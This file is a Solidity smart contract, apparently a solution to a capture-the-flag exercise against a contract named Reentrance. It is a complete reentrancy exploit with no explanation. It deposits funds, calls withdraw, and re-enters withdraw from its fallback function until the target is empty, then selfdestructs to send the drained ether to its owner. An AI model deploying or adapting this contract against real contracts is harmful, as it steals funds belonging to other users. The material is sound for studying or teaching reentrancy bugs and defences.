// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract Attack {
    Reentrance target;
    address payable public owner;
    uint256 public amount;

    constructor(address payable _target, uint256 _amount) public payable {
        owner = msg.sender;
        amount = _amount;
        target = Reentrance(_target);
    }

    function donateToTarget() external payable {
        target.donate{value: amount}(address(this));
    }

    function attack() external payable {
        target.withdraw(amount);
    }

    fallback() external payable {
        if (address(target).balance != 0) {
            target.withdraw(amount);
        }
    }

    function destroy() external {
        selfdestruct(owner);
    }
}
